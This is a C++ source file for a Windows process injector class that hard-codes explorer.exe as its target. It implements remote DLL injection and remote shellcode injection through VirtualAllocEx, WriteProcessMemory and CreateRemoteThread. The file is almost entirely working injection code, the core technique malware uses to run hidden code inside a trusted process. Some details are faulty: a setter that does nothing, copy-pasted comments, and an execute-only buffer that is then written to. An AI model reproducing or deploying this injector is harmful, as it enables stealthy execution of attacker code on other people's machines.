
#include "TyInjector.h"
#include "TyStringHelper.h"
/*
* Injector class implementation
* 
* Capabilities
*	Remote DLL injection
*	Remote shell code injection
* 
* TODO: Implement error setting for debugging
*/

#include "TyMemoryHelper.h"

TyInjector::TyInjector()
{
	//TyInjector::targetProcessName = (wchar_t*)malloc(targetProcessName.length());
	/*
	std::wstring std_wide = std::wstring(targetProcessName.begin(), targetProcessName.end());
	TyInjector::targetProcessName = (wchar_t*)calloc(1, std_wide.length());
	wchar_t* temp = (wchar_t*)std_wide.c_str();

	wcscpy_s(TyInjector::targetProcessName, (const wchar_t*)temp);
	cout << "test" << endl;
	*/

	//Hard coding for demo
	TyInjector::targetProcessName = (wchar_t*)L"explorer.exe";
}

void TyInjector::setTargetProcess(string targetProcessName)
{
	return;
	// getWideCFromStdString(targetProcessName, TyInjector::targetProcessName);
}

/*
* INPUT: Name of DLL payload to inject into the target process
*/
bool TyInjector::injectDLL(wchar_t* dllName)
{
	HANDLE targetProcess;
	if (!(targetProcess = (HANDLE)getProcessHandleFromWideString(TyInjector::targetProcessName)))
	{
		return false;
	}

	return TyInjector::injectDLL(dllName, targetProcess);
}

bool TyInjector::injectDLL(wchar_t* dllName, HANDLE targetProcess)
{
	int length = (int)wcslen(dllName) + 1;

	//Allocate space for the name of the DLL to inject in the remote process
	LPVOID buffer;
	if (!(buffer = VirtualAllocEx(targetProcess, NULL, (SIZE_T)length * 2, MEM_COMMIT, PAGE_READWRITE)))
	{
		return false;
	}

	//Write the name of the DLL to inject into the newly allocated buffer
	if (!WriteProcessMemory(targetProcess, buffer, dllName, (SIZE_T)length * 2, NULL))
	{
		return false;
	}
	
	//Obtain the address of kernel32 - kernel32 gets allocated at the same address for every process on the Windows OS
	HMODULE k32;
	if (!(k32 = GetModuleHandleA("kernel32.dll")))
	{
		return false;
	}

	//Get the address of LoadLibraryW within kernel32
	LPVOID loadLibraryW;
	if (!(loadLibraryW = GetProcAddress(k32, "LoadLibraryW")))
	{
		return false;
	}

	//Create a remote thread in the target process and have it call LoadLibraryW on the DLL to inject
	HANDLE remoteThread;
	if (!(remoteThread = CreateRemoteThread(targetProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryW, buffer, NULL, NULL)))
	{
		return false;
	}

	return true;
}

bool TyInjector::injectShellcode(LPCVOID shellcodeBuffer, SIZE_T bufferLength)
{
	HANDLE targetProcess;
	if (!(targetProcess = (HANDLE)getProcessHandleFromWideString(TyInjector::targetProcessName)))
	{
		return false;
	}

	return TyInjector::injectShellcode(shellcodeBuffer, bufferLength, targetProcess);
}

bool TyInjector::injectShellcode(LPCVOID shellcodeBuffer, SIZE_T bufferLength, HANDLE targetProcess)
{
	//Allocate space for the name of the DLL to inject in the remote process
	LPVOID remoteBuffer;
	if (!(remoteBuffer = VirtualAllocEx(targetProcess, NULL, bufferLength, MEM_COMMIT, PAGE_EXECUTE)))
	{
		return false;
	}

	//Write the name of the DLL to inject into the newly allocated buffer
	if (!WriteProcessMemory(targetProcess, remoteBuffer, shellcodeBuffer, bufferLength, NULL))
	{
		return false;
	}

	//Create a remote thread in the target process and have it call the shellcode
	HANDLE remoteThread;
	if (!(remoteThread = CreateRemoteThread(targetProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, NULL, NULL)))
	{
		return false;
	}

	return true;
}
